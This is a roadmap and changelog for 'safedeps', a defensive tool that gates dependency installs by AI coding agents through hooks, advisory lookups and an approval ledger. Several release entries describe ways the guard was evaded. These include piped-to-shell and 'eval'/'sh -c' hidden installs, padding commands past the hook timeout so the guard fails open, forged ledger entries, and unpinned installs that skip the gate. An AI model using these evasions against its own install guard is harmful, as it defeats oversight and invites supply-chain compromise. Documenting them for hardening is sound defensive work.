# Safedeps Roadmap

> Timeline and priorities. The **why / how** lives in [`ARCHITECTURE.md`](./ARCHITECTURE.md); the **when / what first** lives here. *(한국어 → [ROADMAP.ko.md](./ROADMAP.ko.md))*

---

## Scope

Safedeps gates **development dependency installs** (npm / pip / cargo / go / gem / maven / nuget). At release time it also runs a repo-tree secret scan, dependency audit, and git-hook install/check (the lane absorbed from the former `security-release-gates`).

Out of scope: OS / system packages, container images, runtime sandboxing, registry integrity, and reputation analysis. Those are different security layers and stay in different tools — see [`ARCHITECTURE.md`](./ARCHITECTURE.md) §1 for the boundary.

---

## v1 — `npm-reorg-guard` (shipped)

- npm-only, self-contained, no external advisory database.
- PreToolUse hook: typosquat / `curl | bash` / non-standard registry pattern blocks.
- PostToolUse hook: lockfile diff + install-script analysis → reorg (rollback) on suspicion.

Limits: npm only, no CVE lookup (pattern matching), evadable by a determined adversary. The GitHub repo has since been renamed `aldegad/safedeps`.

---

## v2 — `safedeps` (shipped, v2.1.x)

The internal engine keeps the v1 `reorg-guard` assets.

### What changed

- **Multi-ecosystem**: npm / yarn / pnpm / pip (poetry, uv, pipenv) / cargo / go / gem / maven / nuget.
- **External advisory databases**: OSV.dev (canonical) + CISA KEV (hard-risk overlay) + GitHub Advisory (enrichment).
- **Three-phase defense**:
  1. Advisory gate (`safedeps check`) — query the advisory databases before the install command is written, decide a safe spec, and record it to the `~/.safedeps/approved-specs/` ledger.
  2. Hook enforcement (`safedeps-pre-guard.sh`) — verify the install matches the ledger.
  3. Post-install reorg (`safedeps-post-verify.sh`) — the v1 engine, rolling back on divergence.
- **Approved-spec TTL** (30 days) + **daily re-check** (revoke + alert when a new CVE appears).
- **No silent fallback**: a provider failure is fail-closed; any override is explicit and observable.

### Milestones (all shipped)

| Milestone | Output |
|---|---|
| `v2.0-doc` | `ARCHITECTURE.md` v2 written and pushed. |
| `v2.1-rename` | Repo / skill id / paths renamed to `safedeps`; `safedeps migrate` moves legacy `~/.npm-reorg-guard` state to `~/.safedeps` and cleans up legacy hooks. |
| `v2.1-providers` | `lib/providers/` — OSV / KEV / GHSA adapters behind one query interface, with a 24h response cache. |
| `v2.1-ledger` | `lib/ledger/` — approved-spec JSON I/O (atomic write, hash, TTL check). |
| `v2.1-cli` | `bin/safedeps` — `check`, `ledger`, `revoke`, `re-check`, `migrate`, `version` subcommands. |
| `v2.1-guard-patch` | `safedeps-pre-guard.sh` — ledger enforcement on top of the v1 pattern blocks. |
| `v2.1-verify-patch` | `safedeps-post-verify.sh` — lockfile-diff comparison against the approved spec on top of the v1 reorg. |
| `v2.1-multi-ecosystem` | pip / cargo / go / gem / maven / nuget command parsing + lockfile snapshots, shared as rollback truth across both hooks. |
| `v2.1-hook-rename` | Hook file namespacing + cross-engine installer (`install-safedeps-hooks.mjs`, idempotent, `--uninstall`). |
| `v2.1-recheck-cron` | Daily re-check LaunchAgent — re-queries every approved spec, revokes + notifies on new CVE/KEV/provider-skip. |
| `v2.1-tests` | End-to-end tests — fixture provider responses drive ledger / hook / re-check / migration checks. |
| `v2.1-release` | npm publish (`@aldegad/safedeps`) + GitHub release. |

### Release notes

- The npm package version in `package.json` is the single source of truth. `bin/safedeps` `SAFEDEPS_VERSION` tracks it and the smoke test reads `package.json` to compare (current: v2.18.0).
- `npm test` runs the release smoke suite; the full fixture E2E lives under `v2.1-tests`.
- The daily re-check uses no LLM tokens. It is opt-in: a macOS `launchd` user agent runs `safedeps re-check --json` daily, installed atomically by `install-safedeps-recheck-agent.mjs`. It writes `~/.safedeps/recheck.log` and `~/.safedeps/recheck-alerts.jsonl` and raises a macOS notification on a new CVE/KEV/revoke/provider-skip/suspected-forgery. Network is used only for OSV / CISA / GHSA queries.

## v2.2 — effect-based enforcement (npm)

Status: shipped as v2.2.0 (npm-first).

### What changed

- **Authority moved to effects**: PostToolUse now reads the actual `package-lock.json` closure and compares every installed `pkg@version` against approved direct specs plus their `transitive_specs`.
- **Full closure approval for npm**: `safedeps check npm <pkg>@<version>` resolves a script-free lockfile in a temp dir with `npm install --package-lock-only --ignore-scripts`, extracts the full closure, and queries OSV `/v1/querybatch`.
- **Batch + cache**: OSV batch responses are written back into the same per `pkg@version` 24h cache used by single-package provider queries.
- **No blind trust for transitives**: a clean direct package with an unapproved or vulnerable transitive dependency is not enough; the full closure must be clean and recorded.
- **PreToolUse demoted to fast UX guard**: command parsing still blocks obvious unapproved install attempts and keeps the bypass regression coverage, but PostToolUse is the primary enforcement surface.
- **Inert install (Claude Code)**: the PreToolUse hook rewrites an npm install to add `--ignore-scripts` via the hook `updatedInput` capability, so the install runs inert; PostToolUse runs `npm rebuild` only after the closure is verified clean, so a rejected package's lifecycle scripts never run. Codex CLI lacks `updatedInput`, so it stays on detect-and-rollback.

### npm-only boundary

This phase covers npm lockfile closure only. pip / cargo / go / gem / maven / nuget keep the v2.1 command/ledger/reorg behavior until each ecosystem has an explicit closure resolver and script/no-execution policy.

### Verification

- closure approval records `transitive_specs`
- unapproved transitive package in `package-lock.json` triggers post-verify reorg
- approved full-closure install passes without false reorg
- heredoc / echo text does not trigger install detection
- existing smoke + fixture E2E regression suite remains green

### Current focus

1. `v2.2.0-release`: merged `safedeps-security-hardening`, tagged `v2.2.0` (GitHub release + `npm publish`).

---

## v2.3 — secret-leak lane doctor + scaffold (shipped)

Status: shipped as v2.3.0.

### What changed

- **`safedeps doctor`** — a repo-entry posture check. It diagnoses the per-repo secret-leak lane (`.gitleaks` policy, `.githooks/pre-commit`, active `core.hooksPath`, scanner availability) and reports the global install-time gate too. Read-only by default, `--json` for agents, exits non-zero when the secret-leak lane has gaps.
- **`safedeps doctor --fix` / `safedeps hooks init`** — scaffolds a starter `.gitleaks.toml` (or `.gitleaks.private.toml`) and `.githooks/pre-commit` from `lib/gates/templates/`, then activates the hooks. Non-destructive: an existing repo-owned policy is never overwritten.
- **Agent-as-security-role framing** — `SKILL.md` makes `safedeps doctor` a repo-entry step so the agent, not a later leak, closes the secret-lane gap. The installer prints a per-repo nudge (no auto-write into repos — the policy boundary stays with the repo).
- **Fail-closed delegation** — the scaffolded `pre-commit` delegates to `safedeps scan secrets --staged` (one canonical scanner path); an unresolvable `safedeps` or a missing scanner blocks the commit rather than skipping silently.

### Design decisions

- `doctor` is holistic but **secret-lane-centric**: its exit code reflects the per-repo lane only; the global dependency gate is reported (`deps` check) but does not gate the repo result.
- safedeps owns **execution**, the repo owns **policy**. Templates are seeds the repo tunes, consistent with the existing Two Lanes invariant.

### Verification

- `safedeps doctor` flags gaps on an unconfigured repo and reports clean after `--fix`
- `hooks init` is non-destructive across a re-run (repo edits survive)
- pre-commit gate denies a committed secret, passes clean and `.env.example` placeholder commits (bypass harness + regression)
- existing smoke + fixture E2E regression suite remains green

---

## v2.4 — fail-closed hooks + supply-chain hardening (shipped)

Status: shipped as v2.4.0.

### What changed

- **Fail-closed gate** — the PreToolUse/PostToolUse hooks no longer `exit 0` (silent pass) when they cannot run. A lock-unavailable install now **denies** fail-closed; an unavoidable `jq`-missing case becomes an **explicit allow-with-warning**; every such outcome is recorded in `~/.safedeps/advisory.log` (observable, per the no-silent-fallback invariant). The PostToolUse path records an un-runnable gate as **UNVERIFIED** rather than a clean pass.
- **`SECURITY.md`** — vulnerability disclosure policy, supported versions, scope, and the by-design security properties (no SaaS, zero deps, no silent fallback).
- **CI hardening** — `actions/*` pinned to commit SHA; the gitleaks download is checksum-verified; a ShellCheck gate (error-clean); a macOS + Linux matrix (the v2.3 `stat` fix proved cross-OS coverage matters); and an `npm pack` step that keeps the zero-dependency property honest.

### Verification

- lock-unavailable install denies fail-closed and logs to `advisory.log`
- jq-missing denies a likely install (best-effort fail-closed) and logs it; only non-install commands fall through
- a missing ledger library denies fail-closed instead of falling through to allow
- ShellCheck (`--severity=error`) is clean across all shell sources
- existing smoke + e2e regression suite remains green on both Linux and macOS

### v2.4.1 — concurrent-install race fix (#5)

The pending state PreToolUse hands to PostToolUse was a single global `current_state` file, so two installs overlapping in one project could clobber each other and the effect gate could verify the wrong install (or skip one). Pending state is now keyed **per install** — `dir_hash` + a hash of the command with the inert-install rewrite normalized out — so PreToolUse and PostToolUse of the same install agree on a key while concurrent installs stay isolated. A concurrency harness (two installs → two pending files; a post consumes only its own) guards it.

---

## v2.5 — pre-commit dependency audit (shipped)

Status: shipped as v2.5.0.

### What changed

- **Pre-commit dependency audit** — the scaffolded `.githooks/pre-commit` now runs `safedeps audit npm` on **every commit** in a repo with an npm lockfile, alongside the secret scan. It catches a vulnerable direct or *transitive* dependency — including a CVE disclosed *after* the package was installed ("looked safe then, flagged now") — at the next commit, by re-querying the advisory DB instead of waiting for the daily re-check. Real usage drove it: a transitive `hono` advisory that Dependabot missed was caught exactly this way.
- **Meaningful `audit npm` exit codes** — `0` clean / `1` vulnerable / `2` could-not-run (no lockfile, npm/jq missing, advisory DB unreachable). This separates the **security verdict** from an **availability failure**; npm audit collapses both into exit 1 on its own.
- **Observable offline failover** — when the advisory DB is unreachable the hook **warns and allows** the commit (exit 2) rather than fail-closing, so a network outage never blocks an offline commit; a real finding (exit 1) still **blocks**. Per the no-silent-fallback invariant the failover is loud (printed to the commit output), and CI / the daily re-check re-cover what the offline commit could not verify.

### Verification

- `audit npm` exit-code contract (clean=0 / vulnerable=1 / unreachable=2), deterministic via a fake npm
- pre-commit blocks a commit carrying a vulnerable dependency; warns + allows when the advisory DB is unreachable
- existing secret-lane + smoke + e2e regression suite remains green

---

## v2.6 — English CLI output + hook hardening (shipped)

Status: shipped as v2.6.1.

### What changed (v2.6.0)

- **English-only agent-facing CLI output** — all CLI and hook messages an agent reads are English, so behavior does not depend on the operator's locale. The README hero gained a demo GIF.

### v2.6.1 — hook timeout + install false-positive hardening

A Codex PostToolUse hook was observed hanging ~600s on an unrelated Bash command. Three root causes, all fixed at the repo SSoT (the installer and the hooks), not just the live global config:

- **Hook timeout, registered and backfilled.** The installer now writes an explicit `timeout` (30s) on both engines' Pre/Post safedeps hooks and backfills it onto existing registrations. Previously it registered hooks with no timeout, and its idempotency check compared only the command — so a re-run could never add a missing timeout. Codex had no timeout cap, so a heavy hook ran unbounded.
- **Install-detection false positives removed.** `command_is_dependency_install` no longer flags bare `npx` / `npx --version`, and the indirection catcher now extracts `eval` and command-substitution payloads and judges by **execution position** instead of matching `$(`/backtick plus a `manager`…`verb` substring anywhere in the raw command. So `echo "npm install …"`, `grep`, heredoc/doc text, and `X=$(date); echo "…npm install…"` no longer create a snapshot. Genuine hidden installs (`eval "npm install …"`, `$(npm install …)`, `… | sh`) are still reduced to ledger specs and denied — fail-closed when no spec can be extracted.
- **Legacy pending fallback bounded.** The PostToolUse legacy/global pending fallback now runs only when the pending project matches the command's cwd and the command looks like an install. A mismatch writes an observable `post-verify SKIP` advisory and no-ops instead of entering closure/OSV verification for an unrelated command.

### Verification

- installer registers and backfills the 30s timeout on both engines (e2e)
- false-positive corpus (grep / echo / heredoc / `node` / `npm run` / `npm view` / `npx --version` / command-substitution + install text in data) produces no snapshot; hidden-install indirection still denies and snapshots (smoke)
- a stale legacy pending plus an unrelated Bash command no-ops with an observable skip (e2e)
- existing smoke + e2e regression suite remains green; zero npm dependencies; effect-primary stays npm-only; no silent fallback

---

## v2.7 — remote PR governance opt-in (shipped)

Status: shipped as v2.7.0.

### What changed

- **Remote repository posture in `doctor`** — `safedeps doctor` now reports a `remote` lane that detects an existing security workflow and names two default-branch postures: no-runner direct-push protection and CI-backed required checks.
- **Cost boundary made explicit** — blocking direct pushes to `main` with a branch rule does not run Actions and is recommended in the no-paid-CI setup. Remote GitHub Actions, CI gitleaks, and required PR checks may spend hosted-runner minutes, so safedeps only reports and nudges. It does not create workflows, query or mutate branch protection, or mark missing remote checks as repo posture failure.
- **Local-first fix remains automatic** — `doctor --fix` still scaffolds `.gitleaks` policy and repo-local pre-commit hooks, but it never creates `.github/workflows`.
- **JSON schema fixed** — `doctor --json` now keeps all checks, including `ok` rows without a remedy (`remedy: null`), and documents `lane: "secret | deps | remote"`.

### Verification

- `doctor` reports missing remote workflow as an opt-in `remote` gap and names no-runner direct-push protection separately from CI-backed required checks
- `doctor --fix` keeps `.github/workflows` absent and reports `ok: true` after the local secret lane is fixed
- existing smoke + e2e regression suite remains green; zero npm dependencies; remote cost-bearing enforcement stays opt-in, while no-runner direct-push protection is recommended posture

---

## v2.8 — adversarial re-audit + global-install fix (shipped)

Status: shipped as v2.8.1.

### v2.8.0 — adversarial re-audit (7 findings)

A multi-agent adversarial re-audit (22 raised → three-lens skeptic verification → 7 confirmed) closed real gaps, each reproduced by a regression test:

- **Parser bypass (critical)** — a leading whitespace or a bare `VAR=val ` env-prefix slipped past the install classifier entirely, disabling the gate, inert rewrite, snapshot, and effect gate at once. `normalize_install_text` now strips leading whitespace and bare assignment prefixes (quoted values excepted, so `msg="run npm install"` stays a non-match) at the single point every classifier passes through.
- **`bun` ungated** — `bun add` / `bun install` matched no classifier. Added to the install pattern, ecosystem detection (→ npm), pipe payloads, and the lock-file set (`bun.lock` / `bun.lockb`).
- **`--prefix` escape** — an install-dir override (`--prefix` / `--cwd` / `--dir` / `--install-dir`) was ignored by the effect gate, which then cleared cwd by mistake. Snapshot and effect-gate targets are redirected to the real install dir (the pending key stays on cwd so the post hook still matches).
- **`producer | sh` plain pipe** — pipe-to-shell detection ran only on command-substitution payloads; it now also runs on the raw command, catching `printf 'pip install x' | sh`.
- **Effect gate depended on the parser** — the README advertised a "command-independent backstop", but it only ran when pending state existed, inheriting the parser's blind spots (doc/code drift). The no-pending branch is now a true command-independent backstop (live `package-lock.json` closure check); auto-rollback runs only against a confirmed baseline, otherwise it fails loud.
- **`launchd` re-check was DOA** — the copied runtime omitted `lib/npm/closure.sh`, so the copied `bin` died at `source` under `set -e` and the daily re-check never ran once. `closure.sh` is now copied, with a post-install runtime smoke guard against future lib drift.
- **Compound inert defeat** — `--ignore-scripts` was appended at the end of the string, so in `npm install evil && npm run build` it landed on the trailing command (the install still ran scripts). Compound commands now inject the flag in place right after the verb, with an observable detect-and-rollback downgrade when in-place injection is not possible.

### v2.8.1 — global-install path resolution

`bin/safedeps` derived its repo dir from `${BASH_SOURCE[0]}` without resolving symlinks. A global install (`npm i -g`, or `~/.local/bin` via the installer's `--link-bin`) puts a file symlink at `<prefix>/bin/safedeps`, so `dirname/..` resolved to the node prefix and every command died at `source <prefix>/lib/providers/providers.sh: No such file or directory`. The bootstrap now walks the symlink chain to the real script (a portable `readlink` loop, not `readlink -f`) before deriving the repo dir. The hooks were unaffected — they are invoked through the skill's directory symlink, where `cd .../scripts && pwd` already lands in the real repo.

### Verification

- the CLI invoked through an npm-style global file symlink resolves its package dir and runs (smoke); the same invocation fails on the pre-fix bootstrap
- the v2.8.0 regression set: leading-space / env-prefix / bun / pipe bypass, compound in-place inert (#7), `--prefix` snapshot target (#3), command-independent backstop (#5)
- existing smoke + e2e regression suite remains green; zero npm dependencies; effect-primary stays npm-only; no silent fallback

---

## v2.9 — multi-ecosystem dependency audit (shipped)

Status: shipped as v2.9.0.

### What changed

- **`safedeps audit` covers npm / pnpm / yarn (Classic + Berry) / bun.** The pre-commit dependency audit was npm-only (it read `package-lock.json` / `npm-shrinkwrap.json` and a pnpm/yarn/bun project got exit 2 — no verdict). `safedeps audit` now auto-detects the ecosystem from the lockfile(s) present and delegates to each tool's native audit, which all query the npm registry advisory endpoint — so the audit lane's advisory source stays consistent across ecosystems (the install-time OSV gate is unchanged and still npm-only).
- **Native delegation, not lockfile parsing.** Each ecosystem's own `audit` command resolves its lockfile and reports advisories; safedeps normalizes the differing report shapes (npm/pnpm `.metadata.vulnerabilities`, yarn Classic NDJSON `auditSummary`, yarn Berry's `yarn npm audit` NDJSON advisory stream, bun's per-package advisory object) into one severity-count verdict. yarn routing detects the major version (Classic 1.x `yarn audit` vs Berry 2+ `yarn npm audit`); bun reads its lockfile so no `node_modules` is required. No new lockfile parsers, and the zero-dependency property is preserved (bun's binary `bun.lockb` never needs parsing).
- **Same exit-code contract, now per ecosystem and aggregate.** `0` clean / `1` vulnerable / `2` could-not-run (no lockfile, tool/jq missing, advisory DB unreachable) holds for every ecosystem. When several lockfiles coexist the aggregate verdict is the worst: a real finding anywhere dominates (1), else an availability failure anywhere (2), else clean (0). No ecosystem is skipped silently.
- **Auto-detecting pre-commit.** The scaffolded `.githooks/pre-commit` now detects any supported lockfile and runs `safedeps audit` (no ecosystem argument). `safedeps audit <eco>` remains for an explicit single-ecosystem run. The offline failover is unchanged: a real finding blocks, an unreachable advisory DB warns and allows.

### Verification

- exit-code contract (clean=0 / vulnerable=1 / unreachable=2) for npm, pnpm, yarn Classic, yarn Berry, and bun, deterministic via fake tools that emit each tool's real report shape — plus aggregate behavior across coexisting lockfiles and bun fail-closed handling of malformed / non-canonical / missing severities
- the scaffolded pre-commit hook blocks a commit carrying a vulnerable pnpm dependency exactly like npm (live integration)
- live-registry sanity: real npm/pnpm/yarn-Classic/bun clean audits return 0; a real pnpm vulnerable audit returns 1; a real Yarn Berry `yarn npm audit` and a real bun audit from a lockfile with no `node_modules` both return 1 on a vulnerable spec
- existing smoke + e2e regression suite remains green; zero npm dependencies; effect-primary stays npm-only; no silent fallback

### v2.9.1 — pre-guard spec-extraction false-positive

The PreToolUse guard extracted `pkg@version` tokens from *every* segment of a compound command, so a token that only appeared in a non-install segment (an `echo` / log line, a path, a comment) was attached to a real install elsewhere and triggered a spurious DENY — e.g. `echo "bumped left-pad@1.0.0"; npm install` was blocked as if installing `left-pad@1.0.0`. Spec extraction is now gated on `command_is_dependency_install` per segment: only a segment that is itself an install command contributes its operands (npx/dlx runners keep their existing operand handling). Real installs, hidden installs (`eval` / `$()` / `… | sh`), and the bypass corpus still DENY; the echoed-mention case now passes. Regression tests cover both the compound (deny names only the real spec) and bare-install (no false deny) cases.

### v2.9.2 — daily re-check alert surfaces suspected ledger forgeries

`safedeps re-check` already flagged ledger entries with no matching `advisory.log` approval record as `suspected_forgery`, but the daily alert wrapper (`safedeps-recheck-alert.sh`) never read that field: a forged entry whose package queries clean counted as `still_clean`, so no alert condition fired and the flag was silently swallowed — exactly the silent-fallback the invariants forbid. The wrapper now counts `suspected_forgery`, includes it in the alert trigger and the notification message, and the alert record carries the flagged entries. Smoke covers both directions: a forgery-only fixture (every other trigger zero) must alert, and a fully clean fixture must append nothing.

Cross-engine validator passes on the same release caught five more holes in the provenance check itself, all reproducible. (1) When `advisory.log` did not exist at all, the check was bypassed entirely (`[[ -f advisory.log ]]` treated file absence as proof of approval) — a missing log is now missing provenance, since every legitimate approval writes the log. (2) The stored ledger `hash` field is attacker-writable, so copying a valid 64-char hash from a legitimate approval let a forged entry for a *different* package borrow that approval's provenance — the canonical hash is now recomputed from the entry's own spec, and a stored-vs-recomputed mismatch is itself flagged (`hash_spec_mismatch`). (3) Log matching used substring `grep -F`, so a hash/package/version *prefix* (or an empty hash) matched a legitimate line. (4) The whole-field fix first used `awk -v`, which interprets backslash escapes in the value, so a forged package field like `fixture-p\141d` normalized to `fixture-pad` and borrowed its approval. Matching is now a pure-bash literal field comparison — no substring, no escape interpretation. (5) The canonical hash joins the three fields with newlines, so a real newline (or other control char) injected into a package/version could shift the field boundary and collide a different tuple onto a legit approval's hash — a spec carrying a control character is now rejected as `malformed_spec` before any hash or provenance comparison runs. e2e regressions cover the no-log, copied-hash, prefix-named, backslash-escape, and control-char forgeries plus the legit-approval-stays-clean case.

---

## v2.10 — Yarn resolution-aware check (shipped)

Status: shipped as v2.10.0.

`safedeps check` judged an npm spec only from its published closure, so a Yarn Berry project that patches a vulnerable transitive dependency through root `resolutions` was denied on a vulnerability it does not actually install. The published closure is the wrong truth for that project — the installed closure is. When the target directory is a Yarn Berry project with a non-empty root `resolutions` entry, `check` now resolves the closure from that project's real `yarn.lock` via `yarn info -A -R --json` instead of probing the registry. Yarn keeps ownership of descriptor-to-locator resolution; safedeps consumes its machine-readable graph rather than re-implementing lockfile resolution.

The resulting approval is project-scoped, not global. The ledger entry carries a `project_context` whose `context_hash` folds in the project directory, the root `resolutions`, and the `yarn.lock` content, so the approval cannot satisfy a lookup from another project or survive a `resolutions`/`yarn.lock` change; a mismatch denies with `context_mismatch`. The PreToolUse guard resolves the same context and folds the same hash into its lookup. Fail-closed behavior is unchanged everywhere else: a declared `resolutions` with an unusable lockfile is an invalid context that denies outright, and a package that cannot be verified in the resolved graph stays deny-only even when its published closure is clean.

## v2.11 — Yarn candidate closure materialization (shipped)

Status: shipped as v2.11.0.

v2.10 could only judge a package that was already in `yarn.lock`, which excluded the case the gate exists for: checking a dependency before adding it. An absent locator fell to `project-closure-unavailable` and became deny-only, so the original release path for a new Yarn dependency was blocked even when the project's own `resolutions` would have resolved it safely.

### What changed

- **Isolated candidate materialization.** When the locator is absent, safedeps builds a private mirror under `mktemp` and copies only the project's canonical resolution inputs: root and workspace `package.json` files, `yarn.lock`, `.yarnrc.yml`, and the `.yarn/releases`, `.yarn/plugins`, and `.yarn/patches` files. `node_modules`, caches, unplugged packages, install state, and VCS data are never copied — they are neither canonical resolution input nor safe to hand to a temporary resolver. The candidate is added to the mirror's manifest only, and Yarn resolves it there with `yarn install --mode=update-lockfile --no-immutable`. That documented mode updates lock resolution without the link step, so no candidate lifecycle script runs.
- **Caller invariance.** The caller's tree is read-only for the whole operation. safedeps re-hashes the project inputs both before and after the Yarn run; a manifest, `resolutions`, config, or lockfile edit landing mid-flight invalidates the candidate rather than producing an approval for a mixed project state.
- **Provenance-bound approval.** The ledger context becomes `yarn-project-materialized-lockfile` and carries `materialization` with the candidate locator, the bound `input_sha256`, the `generated_lockfile_sha256`, the exact Yarn command, and `isolation: "private-project-mirror"`. `safedeps_ledger_validate_json` requires every one of those fields and rejects an entry whose `materialization.input_sha256` disagrees with its context `input_sha256`. Approval truth is therefore neither a registry probe nor a stale lockfile, but the Yarn resolution derived from a hash-bound copy of the caller's own inputs.
- **No fallback.** Any failure to copy inputs, match the mirror to the canonical input hash, invoke Yarn, or resolve the candidate in the generated lockfile denies with `project-candidate-materialization-unavailable`. The published closure is never used as a substitute.

### Verification

- hermetic Yarn project fixture: the candidate approves only when the isolated closure resolves the patched `sharp@0.35.3` / `postcss@8.5.21`; the unpatched `sharp@0.34.5` / `postcss@8.4.31` closure denies
- unavailable materialization denies with no ledger approval and no published-closure probe; a changed input or lock context denies
- caller tree and lockfile hashes are byte-identical before and after; nested `node_modules` is asserted absent from the copied mirror inputs
- existing smoke + e2e regression suite green; zero npm dependencies; effect-primary stays npm-only

---

## v2.12 — npm `overrides` awareness, scoped to its override set (shipped)

Status: shipped as v2.12.0.

`overrides` is the standard npm remediation for a vulnerable transitive, but the closure probe resolved from an empty manifest and never saw it. A repo that had already patched a transitive that way was still denied, so safedeps punished the correct fix. `check` now discovers the consuming repo's `overrides` and applies them to the probe, resolving transitives the way the real install will.

### What changed

- **Overrides reach the probe.** Discovery reads `SAFEDEPS_NPM_OVERRIDES_JSON`, else the nearest `package.json` carrying a non-empty `overrides`, walking up from the working directory and stopping at the repository root. Only concrete pins are honored; `$`-references are dropped, having no meaning in a standalone probe. Failing to apply them is logged rather than silently dropped -- it only makes the check stricter, but an unexplained denial is not observable.
- **The boundary includes worktrees.** A worktree root carries a `.git` file, not a directory, so a directory-only test walked past it and picked up an ancestor's overrides. The walk now matches the Yarn project-context walk-up.
- **The approval is scoped to the override set.** Applying overrides makes the closure a function of the consuming project, and a published-package approval may be global only because it is project-independent. The ledger entry became `npm-overrides-probe`, carrying the project root, the override set, its canonical hash, and a `context_hash` over both; the key folds that hash in. An approval earned in a repo that patched a transitive no longer satisfies the check in a repo that did not, whose real install resolves the vulnerable version. The pre-guard derives the same key, so a scoped approval still passes the gate.

Honoring overrides cannot mask a vulnerability: the probe resolves each one to a concrete version and OSV is queried for that version, so an override pointing at a still-vulnerable release is flagged like any other.

### Verification

- approval scoping live and in tests: patched set approves, the same set reuses its approval, a repo with no overrides is denied, a different override set is denied
- an override pointing at a still-vulnerable version is denied
- pre-guard key parity: allow in the repo that earned the approval, deny in one without those overrides
- hermetic e2e stubs npm so the resolved closure depends on the probe manifest, fixing the whole chain without registry access; the scoping and injection paths are both mutation-verified
- ledger rejects an `npm-overrides-probe` context missing its override-set hash or carrying an empty set

---

## v2.13 — pipe-position hidden-install judgment + guard cost restore (shipped)

Status: shipped as v2.13.0.

The pre-guard's hidden-install detector judged pipe-to-shell by grepping the raw command text. A command that merely *quoted* the idiom — a commit message documenting a repro line — was denied as a hidden install, and two workers hit that on the same day. The fix changes what counts as an execution pipe. This release records that behavior change and restores the guard's constant cost, which the fix had regressed.

### What changed

- **A pipe counts only in execution position.** The pipe-to-shell operator must sit outside quotes and outside heredoc bodies at its own quoting level. The install text is still searched raw, because in a real hidden install it lives inside the producer's quotes by construction. Outer quoting hides inner pipes, so the same check recurses into `sh -c` payloads, `eval` payloads, and command substitutions.
- **Verdict changes a consumer will see** (this guard blocks commits in other repos, so the pass criteria shifted with no version signal until now):
  - *Now allowed:* a commit message or data heredoc quoting `... install ... | sh` as text. These were false-positive denials.
  - *Now denied:* `sh -c "... | sh"` and `eval "... | sh"` wrapped piped installs. The old raw grep required whitespace or end-of-line after the shell name, so a closing quote hugging it (`| sh"`) escaped detection. True-positive detection strictly grew; the substitution, heredoc-redirect, and plain-pipe forms were already caught and still are.
- **Check order restored to cheap-first.** The fix computed the quote-blanked execution view (a quadratic character scan) before the O(n) raw install-text grep, on every command. Both checks are pure predicates, so conjunction order cannot change any verdict — only the cost. The raw grep now runs first and the scan is skipped for the vast majority of commands, which carry no install text at all.

### Verification / measured bounds

- Smoke covers the full case set: 3 quoted-idiom false positives allow, 6 hidden installs (plain pipe, command substitutions, `sh -c`, `eval`, heredoc redirect line) deny. Verdicts were replayed under both check orders in both directions — identical on every case.
- Guard cost on a 6KB benign command: 1.5s before the fix, 2.8s with the fix, 1.4s after the order swap. When install text is present the scan must run and the cost stays ~2.7s at 6KB.
- The PreToolUse hook budget is 30s. The remaining quadratic scanner (compound-command splitting, untouched here) crosses that budget near ~29KB of command text (28KB → 28s measured). That bound predates this release — it sat near ~26KB before the fix — and its linearization is tracked as follow-up work.
- **Crossing the budget is fail-open.** Measured empirically on Claude Code (2026-08-04): a PreToolUse command hook that exceeds its timeout is killed and the tool call proceeds; an in-budget deny from the same hook blocks. So past the size bound this guard silently disappears, and padding a command past it is trivial. For npm the PostToolUse effect gate remains the enforcement authority (with its own 30s budget); for the other ecosystems the command gate is the primary gate, which is why the scanner linearization is tracked as security follow-up, not a nicety. Codex CLI timeout behavior is unmeasured — do not assume parity.
  - **Corrected in v2.15.0 on both halves.** The fail-open is closed at the source: the guard now answers on a budget of its own before the runtime's expires. And the npm sentence above was an assumption about an untimed hook — PostToolUse is killed at its budget too (measured), so npm is not covered past it either. See v2.15.0.

---

## v2.13.1 — the command gate's boundary, measured and written down (shipped)

Status: shipped as v2.13.1.

Five shell forms were reported as command-gate bypasses that old and new code missed alike. The question worth answering was not "can we catch five forms" but "do they get through for one reason or five" -- an earlier enumeration in a sibling tool closed five forms and surfaced nine.

The answer is one reason. The gate recognizes an install by the syntactic carrier that hands text to an interpreter, and that recognition is a closed enumeration applied at one quoting level. Every miss is a carrier outside the list. But fixing "that one spot" does not end the enumeration, because the spot *is* an enumeration: probing the reported five surfaced four more (`| command sh`, a script written then run, `eval` nested inside `sh -c`, a top-level command substitution) without looking hard. The 5-to-9 growth reproduced in a single session.

### What changed

- **One fix, and it is not a new carrier.** `normalize_install_text` already declares that a path-qualified or `env`-prefixed invocation is the bare one. It was applied to the install text and skipped on the consumer side of the pipe, so the two sides of one pipe disagreed about what counts as the same invocation. Normalizing the consumer closes `| /bin/sh`, `| /usr/bin/bash`, `| env sh`, `| env FOO=1 sh`, `| command sh`, and the same forms wrapped in `sh -c`. No new concept, and nothing else in the corpus changed decision.
- **No new carrier syntaxes were added.** A herestring, an `xargs`-built command line, a script written then run, `eval` nested in `sh -c`, and a same-quote nested `sh -c` stay unjudged on purpose. That is where the enumeration grows without converging, and the rule separating the two kinds of change is now written in `ARCHITECTURE.md`.
- **The ecosystem asymmetry is documented.** For npm an unrecognized carrier is *delayed detection*: the effect gate's recognizer is a raw text match with no carrier enumeration, so it fires on the same command and reads the live lockfile. For `pip`, `cargo`, `go`, `gem`, `maven`, and `nuget` nothing is behind the command gate, so the same form is a complete miss recorded as `UNVERIFIED`. Reading a parser gap as npm-shaped was the misreading this fixes.
- **Decoys are separated from gaps.** `sh -c "sh -c "…""` reads as double nesting, but the outer quotes close at the inner ones and nothing installs. `xargs sh -c` without `-I` or `-0` hands the line to `sh` as `$0`. Two of the five reported forms were decoys as written.
- **`scripts/test/consumer-forms.sh`** pins all of it and joins `npm test`.

### Verification

- decision drift measured across the full corpus at `1e33b65` (before the false-positive narrowing), at `main`, and after this fix: the narrowing shrank nothing, and this fix moved six forms from pass to deny and nothing else
- every form's status proved by execution against a fake package manager, so a form counts as a gap only when it actually reaches one
- the npm delayed-detection claim is machine-checked: the same wrapped command that the command gate passes triggers the effect-gate backstop
- the pypi complete-miss claim is machine-checked: `UNVERIFIED` is recorded and no rollback is produced
- battery mutation-verified against the pre-fix tree (red at the first normalization assertion)
- the false-positive corpus from v2.13 stays allowed: quoted idioms, `npm run`, `npx`

## v2.13.2 — the unpinned install is not gated, and now it says so (shipped)

Status: shipped as v2.13.2.

Found while measuring the carrier boundary in v2.13.1, and larger than what that release closed. The ledger gate runs on a parseable `pkg@version` operand. Omit the version and no spec is produced, so the gate never runs. `pip install evil`, `cargo add evil`, `go get example.com/evil`, `gem install evil`, `poetry add`, `uv add`, `bundle add`, and `dotnet add package` all pass. No wrapper is needed — the attacker does not have to reach for a herestring, only to leave the version off.

